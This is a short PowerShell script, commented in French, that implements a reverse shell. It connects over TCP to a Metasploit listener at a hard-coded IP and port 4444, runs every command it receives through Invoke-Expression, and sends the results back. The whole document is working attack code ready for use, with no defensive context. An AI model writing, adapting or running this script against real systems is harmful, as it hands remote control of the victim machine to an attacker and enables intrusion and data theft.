$server = "172.28.137.218"   # Remplacez par l'IP de votre serveur Metasploit
$port = 4444                  # Remplacez par le port que vous avez configuré dans Metasploit

# Créer un client TCP
$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()

# Créer des flux de lecture et d'écriture
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

# Continuer à lire les commandes envoyées par Metasploit
while ($true) {
    # Envoyer le prompt
    $writer.Write("PS > ")
    
    # Lire la commande envoyée par Metasploit
    $cmd = $reader.ReadLine()

    # Si la commande est "exit", quitter la boucle
    if ($cmd -eq "exit") {
        break
    }

    try {
        # Exécuter la commande dans PowerShell et envoyer le résultat
        $output = Invoke-Expression $cmd 2>&1
        $writer.WriteLine($output)
    } catch {
        # En cas d'erreur, envoyer le message d'erreur
        $writer.WriteLine($_.Exception.Message)
    }
}

# Fermer la connexion
$client.Close()
